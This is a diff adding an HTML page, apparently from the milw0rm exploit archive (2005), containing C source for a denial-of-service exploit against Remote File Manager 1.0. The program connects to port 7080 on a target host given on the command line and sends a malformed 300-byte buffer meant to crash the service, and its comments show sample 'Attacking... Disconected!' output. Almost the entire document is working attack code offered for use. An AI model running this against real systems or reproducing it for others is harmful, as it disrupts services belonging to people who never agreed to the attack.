@@ -1,0 +1,108 @@
+<html>
+<head>
+<title>Remote File Manager 1.0 Denial of Service Exploit</title>
+<pre>
+/*
+
+ Server Remote File Manager DoS Exploit
+-------------------------------------------
+  INFGP - Hacking&amp;security Research
+
+[+] Attacking  localhost..
+[+] Build DOS string
+[+] Buffer size = 300 byte
+[+] Sending bad format..
+[+] localhost  : Disconected!
+
+Greats: Infam0us Gr0up,Zone-H,securiteam,str0ke-milw0rm,addict3d,
+Thomas-secunia,Yudha,c0d3r,Kavling Community,1st Indonesian Security,
+Jasakom,ECHO,etc..betst reagrds t0 whell.
+Info: 98.to/infamous
+
+*/
+
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;winsock2.h&gt;
+#pragma comment(lib, &quot;ws2_32.lib&quot;)
+#define size 300
+
+int main (int argc, char *argv[]){
+
+char req[] =
+&quot;M_MZ?S.Y?XPKL&amp;&gt;UM&amp;&lt;_.H;YBKL7-YSYNKG&amp;MKL\?X.JIY.HS&amp;&quot;
+&quot;&lt;GMN?X+9M_MZ?S.Y?XPKL&amp;&gt;UM&amp;&lt;_.H;YBKL7-YSYNKG&amp;MKL\?&quot;
+&quot;X.JIY.HS&amp;&lt;GMN?X+9M_MZ?S.Y?XPKL&amp;&gt;UM&amp;&lt;_.H;YBKL7-YSYN&quot;
+&quot;KG&amp;MKL\?X.JIY.HS&amp;&lt;GMN?X+9M_MZ?S.Y?XPKL&amp;&gt;UM&amp;&lt;_.H;YBKL7-&quot;
+&quot;qv#trog.ro#mkodph&gt;qv#trog.ro#mkodph\n&quot;;
+
+ unsigned int rc,addr,inetsock ;
+ struct sockaddr_in tcp;
+ struct hostent * hp;
+ WSADATA wsaData;
+ char buffer[size];
+
+  memset(buffer,'A',300);
+  memcpy(buffer,req,25);
+
+  if(argc &lt; 2) {
+ printf(&quot;\n\n    Server Remote File Manager DoS Exploit \n&quot;, argv[0]);
+ printf(&quot;   -----------------------------------------\n&quot;, argv[0]);
+ printf(&quot;      INFGP - Hacking&amp;Security Research\n\n&quot;, argv[0]);
+ printf(&quot;[-]Usage: %s [target]\n&quot;, argv[0]);
+ printf(&quot;[?]Exam: %s localhost \n&quot;, argv[0]);
+ exit(-1) ;
+       }
+
+ if (WSAStartup(MAKEWORD(2,1),&amp;wsaData) != 0){
+  printf(&quot;WSAStartup failed !\n&quot;);
+  exit(-1);
+ }
+  hp = gethostbyname(argv[1]);
+ if (!hp){
+  addr = inet_addr(argv[1]);
+ }
+ if ((!hp) &amp;&amp; (addr == INADDR_NONE) ){
+  printf(&quot;Unable to resolve %s\n&quot;,argv[1]);
+  exit(-1);
+ }
+ inetsock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
+ if (!inetsock){
+  printf(&quot;socket() error...\n&quot;);
+  exit(-1);
+ }
+  if (hp != NULL)
+  memcpy(&amp;(tcp.sin_addr),hp-&gt;h_addr,hp-&gt;h_length);
+ else
+  tcp.sin_addr.s_addr = addr;
+
+ if (hp)
+  tcp.sin_family = hp-&gt;h_addrtype;
+ else
+  tcp.sin_family = AF_INET;
+
+ tcp.sin_port=htons(7080);
+
+ printf(&quot;\n[+] Attacking  %s..\n&quot; , argv[1]) ;
+ printf(&quot;[+] Build DOS string\n&quot;);
+ Sleep(1000);
+ printf(&quot;[+] Buffer size = %d byte\n&quot; , sizeof(buffer));
+ rc=connect(inetsock, (struct sockaddr *) &amp;tcp, sizeof (struct sockaddr_in));
+ if(rc==0)
+ {
+
+ Sleep(1000) ;
+ printf(&quot;[+] Sending bad format..\n&quot;) ;
+ send(inetsock , buffer , sizeof(buffer) , 0);
+ printf(&quot;[+] %s  : Disconected! \n\n&quot; ,  argv[1]) ;
+}
+ else {
+ printf(&quot;[-] Port :7080 is invalid.Server not connected!\n&quot;);
+}
+}
+
+// milw0rm.com [2005-05-08]
+</pre>
+</html>
+
